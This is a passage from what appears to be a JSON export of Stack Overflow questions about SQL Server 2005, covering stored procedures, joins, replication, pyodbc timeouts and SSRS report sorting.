you.</p>\n"},{"tags":["sql-server-2005","vbscript","asp-classic"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1490,"score":0,"question_id":4997314,"title":"Problem retrieving an OUTPUT variable from SQL Stored Procedure via ASP (Classic VBSCRIPT)","body":"<p>I'm new here and this is my first post. I created a stored procedure in SQL Server that has (4) input parameters and (1) output parameter. The stored procedure is used to insert or delete a record into / from a table. The output parameter is assigned a message to be returned to the ASP page to provide feedback as to what happened in the stored procedure. ie. \"Record Inserted\", \"Record Already Exists\", or \"Record Deleted\".</p>\n\n<p>When I run the code from the web page, records are added and deleted as they should be. The only problem I seem to be having in getting the output parameter to return a value. </p>\n\n<p>When I execute the stored procedure from SQL Server Management Studio, The output parameter is displayed. </p>\n\n<p>I've searched the internet and checked my code against other examples. I am not sure why else I wouldn't get the returned values. Any help would be greatly appreciated.</p>\n\n<pre><code>CREATE PROC My_Stored_Procedure\n    -- Add the parameters for the stored procedure here\n\n    @ContactID AS INT = '0', /* Contact ID relates to br_UID from the dbo.Reporting_Contacts table */\n    @FacNum AS CHAR(4) = '0866', /* Facility Number from the Reporting Admin Page on Intranet */\n    @EmployeeID AS CHAR(8) = '10023258', /* EmployeeID from the Reporting Admin Page on Intranet */\n    @Delete AS CHAR(1) = 'N', /* Delete flag value to be passed from webpage on Intranet */\n    @OutputMessage AS NVARCHAR(200) = 'test' OUTPUT /* To send back sucuess or error messages */\n\nAS\n\nBEGIN\n\n    -- SET NOCOUNT ON added to prevent extra result sets from\n\n    -- interfering with SELECT statements.\n\n    SET NOCOUNT ON;\n\n    -- Set variables for use in Stored Procedure\n\n\n    -- Insert statements for procedure here\n\nIF  @Delete = 'N'\n\n        BEGIN\n\n\nIF @EmployeeID  NOT IN (SELECT HGISSN FROM Main)\n\nBEGIN\n\nSelect * FROM dbo.Reporting_Contacts\n\nSET @OutputMessage = 'Contact does not exist as an employee.'\n\nEND\n\n\nIF @EmployeeID IN (SELECT employeeID FROM dbo.Reporting_Contacts WHERE EmployeeID = @EmployeeID AND FacilityNumber = @FacNum)\n\n\nBEGIN\n\nSELECT @OutputMessage = 2\n\nPRINT @OutputMessage \n\nSET @OutputMessage =  'This Person is already a contact.'\n\n\nEND\n\nIF @EmployeeID IN (SELECT HGISSN FROM dbo.EMP_Table) AND @EmployeeID NOT IN (SELECT employeeID FROM dbo.Reporting_Contacts WHERE EmployeeID = @EmployeeID AND FacilityNumber = @FacNum)\n\nBEGIN\n\nINSERT INTO dbo.Reporting_Contacts (employeeID, FacilityNumber, ContactLevel)\n\nVALUES (@EmployeeID, @FacNum, 'S')\n\nSET @OutputMessage = 'New Contact has been added.'\n\nEND\n\nEND\n\n\nELSE IF @Delete = 'Y'\n\n        BEGIN\n\n\nDELETE FROM dbo.Reporting_Contacts WHERE br_UID = @ContactID\n\n\nSET @OutputMessage = 'Record Deleted'\n\n\nEND\n\n\n\nEND\n\nSELECT @OutputMessage\n\nGO\n</code></pre>\n\n<p>This is my VBScript:</p>\n\n<pre><code>Dim addContacts__ContactID\n\naddContacts__ContactID = \"0\"\n\nif(Request(\"ContactID\") &lt;&gt; \"\") then addContacts__ContactID = Request(\"ContactID\")\n\n\n\nDim addContacts__FacNum\n\naddContacts__FacNum = LEFT(Request.Form(\"FacilityNumber\"),4)\n\nif(Request(\"FacNum\") &lt;&gt; \"\") then addContacts__FacNum = Request(\"FacNum\")\n\n\n\nDim addContacts__EmployeeID\n\naddContacts__EmployeeID = Request.Form(\"EmployeeID\")\n\nif(Request(\"EmployeeID\") &lt;&gt; \"\") then addContacts__EmployeeID = Request(\"EmployeeID\")\n\n\n\nDim addContacts__Delete\n\naddContacts__Delete = \"N\"\n\nif(Request(\"Delete\") &lt;&gt; \"\") then addContacts__Delete = Request(\"Delete\")\n\n\n\n\nDim strReturnMessage\n\n\nset addContacts = Server.CreateObject(\"ADODB.Command\")\n\naddContacts.ActiveConnection = MY_STRING\n\naddContacts.CommandText = \"My_Stored_Procedure\"\n\naddContacts.CommandType = 4 'Evaluate as a stored procedure\n\naddContacts.CommandTimeout = 0\n\naddContacts.Prepared = true\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@RETURN_VALUE\", 3, 4)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@ContactID\", 3, 1,10,addContacts__ContactID)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@FacNum\", 129, 1,4,addContacts__FacNum)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@EmployeeID\", 129, 1,8,addContacts__EmployeeID)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@Delete\", 129, 1,1,addContacts__Delete)\n\naddContacts.Parameters.Append addContacts.CreateParameter(\"@OutputMessage\", 200, 2,200)\n\n\nstrReturnMessage =  addContacts.Parameters(\"@OutputMessage\")\n</code></pre>\n"},{"tags":["sql","sql-server-2005","iis6"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12980960,"title":"Unable to access SQL Server from IIS 6.0","body":"<p>I have a ASP.NET website that needs to interact with a SQL Server database.</p>\n\n<p>The website is hosted in IIS 6.0. </p>\n\n<p>The web admin has created a domain User account EncryptedUser and \nEnable anonymous access is run under this EncryptedUser user account.\nAlso, the Integrated Windows Authentication checkbox is checked.</p>\n\n<p>I have the following Connection String in the web.config </p>\n\n<pre><code>&lt;add name=\"MyconnectionString\" connectionString=\"Data Source=MYSQLSERVER;Initial Catalog=Mydatabase;Integrated Security=True;\"/&gt;\n</code></pre>\n\n<p>I tried running this with <code>&lt;identity impersonate=\"true\"/&gt;</code></p>\n\n<p>I am unable to access data. Any thoughts?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12967467,"title":"Using Table valued function the code","body":"<pre><code>&lt;pre&gt;\nI have 3 tables and one table valued function: EmpHistory,EmpRank,Emp and fnEmpRank.\nThe sample data are given as follows:\nEmpHistory\nEmpHistID  EmpID  RankID  MonitorDate  RankName\n1          aba     JPR     2008-10-06   Junior Prof\n2          aba     JPR     2009-11-07   Junior Prof\n3          aba     TERM    2012-2-08    Termoinated Prof\n4          aba     ASST    2012-6-22     lab Assistant\n5          aba     ASST    2012-7-2      Lab Assistant\n6          aba     TSST    2012-8-4      Terminated Assistant\n\nEmpRank\nRankID    RankName\nJPR       Junior Professor\nSPR       Senior Professor\nASST      Junior Assistant\nSASST     Senior Assistant\nPL        Principal\n\nEmployee\nEmpID    EmpStartDate\naba       2008-10-06\nabc01     2007-09-23\nsdh        2009-7-26\nsbs        2012-2-8\n\n\nThe fnEmpRank function takes the emproleID and gives the employee history same as the empHistory Table. There is also empoyeerole table which has employeeroleid column.\n\nNow my problem is: I want the second last professor rank of the employee i.e in this case I want Junior Professor row(i.e) 2nd row from emphistory table). Currntly my code is using emphistory table but now intead of that table I want to use fnEmpRank as it gives the same data. I am also giving the sample code.\n\n\nselect\na.EmpID,\na.StartDate,\nJ.RankID,\nc.MonitorDate,\nfrom dbo.vwEmployee A(nolock)\nINNER join dbo.EmpHistory c(nolock) on c.Empid = a.EmpID\nand c.EmpHistoryID = (select max(c1.EmpHistoryID)\n            from dbo.EmpHistory c1(nolock)\n            where c1.Empid = c.EmpID\n            and c1.MonitorDate = \n                    (\n</code></pre>\n\n<p>I have 3 tables and one table valued function: EmpHistory,EmpRank,Emp and fnEmpRank.\n    The sample data are given as follows:</p>\n\n<p>create table EmpHistory(\nEmpHistID int,\nEmpID varchar,\nRankID varchar,\nMonitordate Date,\nRankname varchar)</p>\n\n<p>insert into EmpHistory\nselect 1,'aba','JPR','2008-10-6','Junior Professor'</p>\n\n<p>insert into EmpHistory\nselect 2,'aba','JPR','2009-11-7','Junior Professor'</p>\n\n<p>insert into EmpHistory\nselect 3,'aba','TERM','2012-2-8','Terminated Prof'</p>\n\n<p>insert into EmpHistory\nselect 4,'aba','ASST','2012-6-22','Lab Assistant'</p>\n\n<p>insert into EmpHistory\nselect 5,'aba','ASST','2012-7-2','Lab Assistant'</p>\n\n<p>insert into EmpHistory\nselect 1,'aba','JPR','2012-8-4','Terminated Assistant'</p>\n\n<p>create table EmpRank(\nRankID varchar,\nRankName varchar\n)</p>\n\n<p>insert into EmpRank\nselect 'JPR','Junior Professor'</p>\n\n<p>insert into EmpRank\nselect 'SPR','Senior Professor'</p>\n\n<p>insert into EmpRank\nselect 'ASST','Junior Assistant'</p>\n\n<p>insert into EmpRank\nselect 'SASST','Senior Assistant'</p>\n\n<p>insert into EmpRank\nselect 'PL','Principal'</p>\n\n<p>create table Employee(\nEmpID varchar,\nEmpStartDate date\n)</p>\n\n<p>insert into Employee\nselect 'aba','2008-10-06'</p>\n\n<p>insert into Employee\nselect 'abc01','2007-9-23'</p>\n\n<p>insert into Employee\nselect 'sdh','2009-7-26'</p>\n\n<p>insert into Employee\nselect 'sbs','2012-2-8'</p>\n\n<pre><code>The fnEmpRank function takes the emproleID and gives the employee history same as the empHistory Table. There is also empoyeerole table which has employeeroleid column.\n\nNow my problem is: I want the second last professor rank of the employee i.e in this case I want Junior Professor row(i.e) 2nd row from emphistory table). Currntly my code is using emphistory table but now intead of that table I want to use fnEmpRank as it gives the same data. I am also giving the sample code.\n\n\nselect\na.EmpID,\na.StartDate,\nJ.RankID,\nc.MonitorDate,\nfrom dbo.vwEmployee A(nolock)\nINNER join dbo.EmpHistory c(nolock) on c.Empid = a.EmpID\nand c.EmpHistoryID = (select max(c1.EmpHistoryID)\n            from dbo.EmpHistory c1(nolock)\n            where c1.Empid = c.EmpID\n            and c1.MonitorDate = \n                    (\n                    SELECT MAX(C2.MonitorDate)\n                    FROM dbo.EmpHistory C2\n                    WHERE C2.EmpID = C1.EmpID\n                    )\n\n                    )\njoin dbo.EmpRank d(nolock) on d.RankID = a.RankID\nleft join dbo.EmpHistory f(nolock) on f.EmpID = a.EmpID\n    and f.EmpHistoryID = (select max(g.EmpHistoryID)\n                from dbo.EmpHistory g(nolock)\n                where g.EmpID = a.EmpID\n                AND G.RankID not like 'T%'\n                and g.EmpHistoryID &amp;lt; c.EmpHistoryID)\nleft join dbo.EmpRank h(nolock) on h.RankID = f.RankID\n\nLEFT JOIN dbo.EmpHistory J(NOLOCK) ON J.EmpID = A.EmpID \n    AND J.EmpHistoryID = (\n        SELECT max(K.EmpHistoryID )\n        FROM dbo.EmpHistory K(NOLOCK) \n        WHERE K.EmpID = J.EmpID\n        AND K.AgentRankID NOT LIKE 'T%'\n        AND K.MonitorDate = (\n            SELECT max(M.MonitorDate )\n            FROM dbo.EmpHistory M(NOLOCK)\n            WHERE M.EmpID = J.EmpID \n            AND M.RankID NOT LIKE 'T%'\n        )\n    )\n\nwhere\nA.Prof=1\n c.RankID like 'T%'\nAND c.RankID &lt;&gt;'TSST'\nAND A.StartDate is not null\n\nHere there is one more problem: Even if the Employee is terminated from professor to Assitant, A.Prof values is still 1 and basically Assistant dont have the start dates but when professor are transformed to Assitant, they still contain the start date. How can I handle this in the code. Basically this code assumes that that if emp has the start date then he is the professor. Can any one help me?\n\n\n                    SELECT MAX(C2.MonitorDate)\n                    FROM dbo.EmpHistory C2\n                    WHERE C2.EmpID = C1.EmpID\n                    )\n\n                    )\njoin dbo.EmpRank d(nolock) on d.RankID = a.RankID\nleft join dbo.EmpHistory f(nolock) on f.EmpID = a.EmpID\n    and f.EmpHistoryID = (select max(g.EmpHistoryID)\n                from dbo.EmpHistory g(nolock)\n                where g.EmpID = a.EmpID\n                AND G.RankID not like 'T%'\n                and g.EmpHistoryID &lt; c.EmpHistoryID)\nleft join dbo.EmpRank h(nolock) on h.RankID = f.RankID\n\nLEFT JOIN dbo.EmpHistory J(NOLOCK) ON J.EmpID = A.EmpID \n    AND J.EmpHistoryID = (\n        SELECT max(K.EmpHistoryID )\n        FROM dbo.EmpHistory K(NOLOCK) \n        WHERE K.EmpID = J.EmpID\n        AND K.AgentRankID NOT LIKE 'T%'\n        AND K.MonitorDate = (\n            SELECT max(M.MonitorDate )\n            FROM dbo.EmpHistory M(NOLOCK)\n            WHERE M.EmpID = J.EmpID \n            AND M.RankID NOT LIKE 'T%'\n        )\n    )\n\nwhere\nA.Prof=1\n c.RankID like 'T%'\nAND c.RankID &lt;&gt;'TSST'\nAND A.StartDate is not null\n\nHere there is one more problem: Even if the Employee is terminated from professor to Assitant, A.Prof values is still 1 and basically Assistant dont have the start dates but when professor are transformed to Assitant, they still contain the start date. How can I handle this in the code. Basically this code assumes that that if emp has the start date then he is the professor. Can any one help me?\n&lt;/pre&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12973500,"title":"Sql view combining columns and rows","body":"<p>I have two tables filled by a program. One contains an id, a name an 15 property names. The other refers to the id from table 1 and a property number and contains the value to each property for different items.<br>\nSo table 1:  </p>\n\n<pre><code>tab1_id | item_type | property_name_1| ... |property_name_15\n</code></pre>\n\n<p>table 2:</p>\n\n<pre><code>item_id | tab1_id | property_nr | value\n</code></pre>\n\n<p>I would like to create a view containing the properties for a specified item_type as colums:</p>\n\n<p>view:  </p>\n\n<pre><code>item_id |property_name_1 | ... | property_name_X \n...     |  value_1       | ... | value_x\n</code></pre>\n\n<p>And now to the additional problem:\nThere can be multiple entries in table 1 per item_type because there can be more than 15 properties per item type.<br>\nOf course there can also be less than 15 properties per item_type.</p>\n\n<p>Based on the item type one would have to find out which property numbers are used, extract their names from table 1 and then fill the view with the values of that property number from table 2.</p>\n\n<p>I know this could be easily done by writing an external tool but the preferred method would be to do this on the server in sql.</p>\n\n<p>So two questions: Is that even possible to create something like that as a view or stored procedure in mssql? </p>\n\n<p>And if yes could you point me to a way of doing this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","synchronization"],"answer_count":6,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":1171,"score":4,"question_id":1085783,"title":"SQL Server 2005 - Syncing development/production databases","body":"<p>I've got a rather large SQL Server 2005 database that is under constant development. Every so often, I either get a new developer or need to deploy wide-scale schema changes to the production server.</p>\n\n<p>My main concern is deploying schema + data updates to developer machines from the \"master\" development copy.</p>\n\n<p>Is there some built-in functionality or tools for publishing schema + data in such a fashion? I'd like it to take as little time as possible. Can it be done from within SSMS?</p>\n\n<p>Thanks in advance for your time</p>\n"},{"tags":["sql","sql-server-2005","triggers","timeout"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12971347,"title":"Program started from trigger times out a db-access","body":"<p>I call a programm from a trigger </p>\n\n<pre><code>SET @exeCall = 'C:\\...\\XMLResultValueSplitter.exe '+CAST(@resultID as nvarchar(40))\nEXEC master.dbo.xp_cmdshell @exeCall\n</code></pre>\n\n<p>The Programm reads the new, inserted line (by the resultId), splitts up several xmlvalues of it and inserts some values to another table.\nBut when executing it by the tirgger i get a timeout (starting it <em>normal</em>, it works of course)</p>\n\n<p>Do you knwo how to handle this problem?</p>\n\n<p>Thank you, Karl</p>\n"},{"tags":["sql","sql-server-2005","join"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12969058,"title":"join if entry doesn't exists in second table","body":"<p>I have two tables which are selected an joined,</p>\n\n<p>Table1</p>\n\n<pre><code>PK    Val1    Val2     FK\n1     a       b        10\n2     c       d        11\n3     e       f\n4     g       h        12\n</code></pre>\n\n<p>Table2</p>\n\n<pre><code>PK    Val3\n10     X\n11     Y\n12     Z\n</code></pre>\n\n<p>When I do a select on this both tables with an inner join and all the Val-Columns I get this result:</p>\n\n<pre><code>Result\nPK    Val1    Val2     Val3\n1     a       b        X\n2     c       d        Y\n4     g       h        Z\n</code></pre>\n\n<p>As you can see the third entry is missing.\nWhat I want is something like this:</p>\n\n<pre><code>Result\nPK    Val1    Val2     Val3\n1     a       b        X\n2     c       d        Y\n3     e       f\n4     g       h        Z\n</code></pre>\n\n<p>How do I have to modify the joinquery</p>\n\n<pre><code>SELECT ... FROM Table1 INNER JOIN Table2 On Table1.FK = Table2.PK\n</code></pre>\n\n<p>Thank you, Karl</p>\n"},{"tags":["sql","sql-server","sql-server-2005","join","temporary-tables"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1221,"score":3,"question_id":1326608,"title":"Speeding up temp table joins in SQL Server","body":"<p>I have 2 temp tables #temp1 and #temp. Both have a key and date columns. Both have around 25k rows. And I'm left joining them on the basis of the key and date which are unique on all rows. It's taking around 4 minutes for this join to complete. Is there any way to speed it up or any alternative methods?</p>\n"},{"tags":["sql-server-2005","declarative"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12966405,"title":"Output from multiple identity inserts into another table","body":"<p>I'm trying to take the data from multiple tables and import them into other tables. The destination use identity id's and the source tables have different id's. I need to get the new identity id's from the inserts and add them to another table in the destination DB. Here is what I have so far but not sure how to get it to work. I tried adding the TMMYId to the OUTPUT but that isn't working.</p>\n\n<pre><code>DECLARE @MakeModels TABLE (MakeId int, ModelId int, YearId int, TMMYId int)\n\nINSERT INTO @MakeModels (MakeId, ModelId, YearId, TMMYId)\nSELECT MakeID, ModelID, YearID, T.id TypeMakeModelYear T \nJOIN Fitment F \nON F.TMMYID = T.id JOIN PartToAppCombo P ON F.PartToAppComboID = P.ID\nWHERE P.PartmasterID IN (SELECT PP.PartMasterID FROM PartPriceInv PP WHERE Discontinued   \n= 0)\n\nDECLARE @MakeOutput TABLE (MakeId int, TMMYId int)\nDECLARE @ModelOutput TABLE (ModelId int, TMMYId int)\nDECLARE @YearOutput TABLE (YearId int, TMMYId int)\n\nINSERT INTO Class1 (Name, Active) \nOUTPUT INSERTED.Class1Id, MM.TMMYId INTO @MakeOutput\nSELECT M.Description, 1 FROM Makes M JOIN @MakeModels MM ON M.id = MM.MakeId\nWHERE NOT EXISTS (SELECT Class1Id FROM Class1 WHERE Name = M.Description )\n\nINSERT INTO Class2 (Name, Active) \nOUTPUT INSERTED.Class2Id, MM.TMMYId INTO @ModelOutput\nSELECT M.Description, 1 FROM Models M JOIN @MakeModels MM ON M.id = MM.ModelId\nWHERE NOT EXISTS (SELECT Class2Id FROM Class2 WHERE Name = M.Description)\n\nINSERT INTO Class3 (Name, Active) \nOUTPUT INSERTED.Class3Id, MM.TMMYId INTO @YearOutput\nSELECT M.Description, 1 FROM Years M JOIN @MakeModels MM ON M.id = MM.YearId\nWHERE NOT EXISTS (SELECT Class3Id FROM Class3 WHERE Name = M.Description)\n\nINSERT INTO MMY (class1Id, class2Id, class3Id) \nSELECT M.MakeId, MO.ModelId, Y.YearId FROM @MakeOutput M JOIN @ModelOutput MO ON    \nM.TMMYId = MO.TMMYId\nJOIN @YearOutput Y ON MO.TMMYId = Y.TMMYId\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":4,"favorite_count":10,"up_vote_count":15,"down_vote_count":0,"view_count":1656,"score":15,"question_id":1038506,"title":"Efficient way of getting @@rowcount from a query using row_number","body":"<p>I have an expensive query using the row_number over() functionality in SQL Server 2005.  I return only a sub list of those records as the query is paginated.  However, I would like to also return the total number of records, not just the paginated subset.  Running the query effectively twice to get the count is out of the question.</p>\n\n<p>Selecting count(*) is also out of the question as the performance is absolutely terrible when I've tried this.</p>\n\n<p>What I'd really love is @@ROW_NUMBERROWCOUNT :-)</p>\n"},{"tags":["sql-server","tsql","sql-server-2005","declarative"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12965114,"title":"How can I do this without a cursor or loop?","body":"<p>I hear to use Declarative programming but I have no idea how to do something like this in sql server 2005\n(I typed this up really fast so I'm not sure if all the syntax is correct but I think you'll understand what I'm looking for)</p>\n\n<pre><code>declare curs cursor for\nselect @Name, @Description, @Id FROM TableA\nopen curs\nwhile(1=1) \nbegin\n    fetch next from curs into\n        @Name,\n        @Description,\n        @Id\n    if(@@fetch_status&lt;&gt;0) break\n\n    set @recordCount = (SELECT COUNT(*) As RecordCount FROM Class1 WHERE          \n            Class1Id = @Id)\n    if(@recordCount &gt; 0)\n    begin\n\n        if(@Name = 'BAD NAME') CONTINUE\n        UPDATE Class1 SET \n            Name = @Name\n            , Description = @Description\n            WHERE Class1Id = @Id\n    end\n    else\n    begin\n        INSERT INTO Class1 (Class1Id, Name, Description)\n        VALUES (@Id, @Name, @Description)\n    end\n\nend\nclose curs\ndeallocate curs\n</code></pre>\n"},{"tags":["sql-server-2005","ssh","replication","vpn","tunnel"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":1027,"score":1,"question_id":236242,"title":"Can I do SQL Server 2005 merge replication through an SSH tunnel?","body":"<p>Our usage case is a database responsible for accounts, sessions, licenses, etc.  it needs to be polled upon client startup, so high reliability is crucial. As such, we'd like to replicate across different servers in physically separate networks, just in case an entire datacenter happens to go down. I have successfully set up a push subscription to another server in the same network, so this generally works. It's the connection to servers <em>outside</em> the network that I need to get working now.</p>\n\n<p>Replication doesn't work directly across networks. Microsoft <a href=\"http://msdn.microsoft.com/en-us/library/ms151319(SQL.90).aspx\" rel=\"nofollow\">suggests either a VPN or web replication</a>. The latter strikes me as inefficient (and they do say \"Note: Web synchronization is designed for synchronizing data with portable computers, handheld devices, and other clients. Web synchronization is not intended for high-volume server-to-server applications.\")</p>\n\n<p>The former, a VPN, would work, but I still consider it a needlessly complex solution (not to mention the added potential for security issues) to continuously run a VPN connection. <strong>I'd much rather just run an SSH tunnel.</strong> Yet, I can't find any article that explains how to do this and isn't about MySQL.</p>\n\n<p>I've got an SSH server set up on the subscriber, and have used PuTTY to establish a tunnel from <code>&lt;publisher&gt;:1434</code> to <code>&lt;subscriber&gt;:1433</code>. I cannot, however, get SQL Server Management Studio to connect this way (I'm not sure it supports the <code>:</code> port syntax). I've also set up an alias on <code>&lt;publisher&gt;</code>'s SQL Server Configuration Manager, with <code>@@servername</code> of <code>&lt;subscriber&gt;</code>, pointing to <code>localhost:1434</code>. Connecting to that doesn't appear to work either.</p>\n\n<p>I used the push subscription option, so I figure the publisher needs to connect to the subscriber, not the other way 'round.</p>\n\n<p>Both servers use the default instance, and run SQL Server 2005 SP 2 on Windows Server 2003 SP 2. The SSH server on the subscriber is freeSSHd 1.2.1.</p>\n\n<p>Is this possible at all? Is there another way I can leverage SSH to pretend the machine exists within the same network? Or do I have to go with a VPN?</p>\n"},{"tags":["python","sql-server-2005","pyodbc"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":53,"score":1,"question_id":12945353,"title":"pyodbc.connect timeout argument is ignored for calls to SQL Server","body":"<p>I am using pyodbc on Linux with FreeTDS to connect to SQL Server 2005. I have noticed that the timeout argument to my connection is not being honoured by my queries.</p>\n\n<p>When I run the following I would expect to see timeout errors after both cursor.execute calls.</p>\n\n<pre><code>import pyodbc\nimport time\n\nconnString = 'SERVER=dbserver;PORT=1433;DATABASE=db;UID=dbuser;PWD=dbpwd;' + \\\n    'DRIVER=FreeTDS'\ncnxn = pyodbc.connect(connString , timeout=3)\n\ncursor = cnxn.cursor()\n\nt1  = time.time()\ncursor.execute(\"SELECT MAX(Qty) FROM big_table WHERE ID&lt;10000005\")\nprint cursor.fetchone()\nt2 = time.time()\nprint t2-t1\n\ncursor.execute(\"WAITFOR DELAY '00:00:30'\")\nprint 'OK'\n</code></pre>\n\n<p>Instead I get this output. Indicating that the first db query is taking over 7.5 seconds and the second call is taking 30 seconds without throwing a timeout.</p>\n\n<pre><code>(808432.0, )\n7.56196093559\nOK\n</code></pre>\n\n<p>Is there a better way to force a query timeout using pyodbc and SQL Server?</p>\n"},{"tags":["sql-server-2008","sql-server-2005","c#-4.0","dll",".net-assembly"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":102,"score":5,"question_id":12130591,"title":"Support multiple assemblies on ASP.NET\\C# projects","body":"<p>We're developing a ASP.NET application and having some problems with integration with a MS dll (Microsoft.AnalysisServices)?</p>\n\n<p>The original project was linked to the dll which came with SQLServer2005 (Version=9.0.242.0). After migrating to SQLServer2008R2 (version=10.0.0.0) we encountered this problem: </p>\n\n<blockquote>\n  <p>Could not load file or assembly 'Microsoft.AnalysisServices,\n  Version=9.0.242.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91'\n  or one of its dependencies. The system cannot find the file\n  specified.</p>\n</blockquote>\n\n<p>This is understood since we compile the project with one version and then another version is located on the server. After installing SQLServer2008R2 on the development machine the problem was fixed. </p>\n\n<p>However we now have another problem that we need to support both SQLServer2005 and SQLServer2008R2 environments. I know that we can redirect the search path for the dll using a config file (that it will search for a different version that what it was compiled with), but I can't seem to find instructions how to use it for Web Application (on w3wp). We tried to use \"Specific Version\"=false, but since this is a \"Strong Name\" assembly it doesn't work as one would think.</p>\n\n<p>The relevant link which I found is this:<br>\n<a href=\"http://social.msdn.microsoft.com/Forums/en-US/sqlanalysisservices/thread/47d0b992-3c10-4851-b2a5-9f72d2c0976e\" rel=\"nofollow\">http://social.msdn.microsoft.com/Forums/en-US/sqlanalysisservices/thread/47d0b992-3c10-4851-b2a5-9f72d2c0976e</a></p>\n\n<p>Can someone please direct me to a link for solving this issue?</p>\n\n<p>Update: I guess I didn't test it correctly since it doesn't work for other servers in SQLServer2008 R2. I guess you can't use range in the newVersion element. So the question is still opened for everyone! . Bottom line is that I know that I have version 9.0.242.0 but the customers version may be either 9.0.242.0 or 10.0.0.0. Is there a method which I can dynamically choose the correct assembly on the production server</p>\n"},{"tags":["tsql","sql-server-2005","distinct","max"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":53,"score":2,"question_id":12962473,"title":"How do I display all columns from a table while using SELECT DISTINCT & MAX(ID) to remove duplicates?","body":"<p>I have a table that, in some instances, has more than one entry for the same employee.</p>\n\n<p>I only want the employee record with the highest ID.</p>\n\n<p>Example of table structure &amp; data</p>\n\n<pre><code>ID  FirstName   LastName    Initials    AreaID  SupervisorID    Forms   JobClass    JobTitle\n----------------------------------------------------------------------------------------    \n805/    Trey/   W/  TW/ 93/ 404/    99/NA/  Temporary/ R1_Temp\n752/    Trey/   W/  TW/ 93/ 404/    99/NA/  Temporary/ R1_Temp \n399/    Ron/    V/  RV/ 144/    NULL/   99/NULL/    NULL/   NULL\n374/    Ron/    V/  RV/ 94/ NULL/   99/NULL/    NULL/   NULL\n379/    Ron/    V/  NULL/   0/  NULL/   99/NULL/    NULL/   NULL\n378/    Dax/    T/  NULL/   0/  NULL/   40/NULL/    NULL/   NULL\n373/    Dax/    T/  DT/ 94/ NULL/   40/NULL/    NULL/   NULL\n398/    Dax/    T/  DT/ 94/ 276/    99/NULL/    NULL/   NULL\n</code></pre>\n\n<p>As you can see, there are three entries for Ron V.  </p>\n\n<p>There are currently ~1000 entries (including duplicates).  The query below returns ~700 (excluding duplicates), which is correct.</p>\n\n<pre><code>SELECT DISTINCT LastName, MAX(ID) as ID\nFROM Employees GROUP BY LastName \norder by LastName DESC\n</code></pre>\n\n<p>This only returns the ID and LastName.  We need to return all the values in the table above.  How do I do it in a single query?</p>\n\n<p>Thank you!</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":12961875,"title":"Command(s) completed succesfully returned when result expected","body":"<p>The stored procedure I created initially worked, but the requirement changed. The requirement is now basically that the results should be like:</p>\n\n<pre><code>item | totalproperty1 | percentofproperty1 | totalproperty2 | ...\n</code></pre>\n\n<p>In doing this, we need the calculation of the total to be in the denominator of the percentage calculation (to prevent having to recalculate the total again for the percentage). To try and do this, I attempted this:</p>\n\n<pre><code>Declare @Item varchar(50)\nDeclare @TotalProperty1 decimal (9,2)\nDeclare @PercentProperty1 decimal (9,2)\nDeclare @TotalProperty2 decimal (9,2)\n...\n</code></pre>\n\n<p>the ... is just more declares of total and percent items, same data types throughout (it's an ugly mess, I apologize)</p>\n\n<pre><code>select @Item = item,\n       @TotalProperty1 = (--long query to get the total\n                          ),\n       @PercentProperty1 = (--long query to get the items compared\n                             / @TotalProperty1),\n       ...\n\nfrom table1 join table2 on table1.table2ID = table2.ID\nwhere -- condition\n</code></pre>\n\n<p>The ... in this section is repeats of the Total/Percent calculations, just for different properties.</p>\n\n<p>I've deleted the closing parentheses on each of the subqueries and readded them to verify they match the opening ones of the subqueries. Before, the calculation was basically a total of all the properties matches vs. the total number of items, but the requirement made it more granular.</p>\n\n<p>When I attempt to execute the alter script, it says \"Command(s) completed successfully.\" which is great, but when I attempt to execute the stored procedure, it, too, returns \"Command(s) completed successfully.\" which is not the expected result (I think the \"select @item... conditions\" section should still return the select statement, correct?).</p>\n\n<p>The main change from the previous working one vs. the current one is that before, I wasn't doing the select variable = query, variable2 = query, etc. but rather a typical select statement. If I had to guess, that'd be the issue, but I was using <a href=\"http://www.sql-server-helper.com/error-messages/msg-141.aspx\" rel=\"nofollow\">this as a guide</a> in relation to the Msg 141 I was receiving midway through.</p>\n"},{"tags":["sql-server-2005","reporting-services","bids"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":29,"score":2,"question_id":12961861,"title":"Is there a way to make user sort results stay on an SSRS 2005 report refresh","body":"<p>I'm relatively new to the SQLServer world and I'm trying to learn SSRS 2005 for the company I'm working with, so forgive me if I have missed any obvious answers in my research.</p>\n\n<p>The problem I'm having is that I have a report which allows users to sort the main table by columns, only when the report is refreshed by the reporting server, the user sort is reset. This is causing 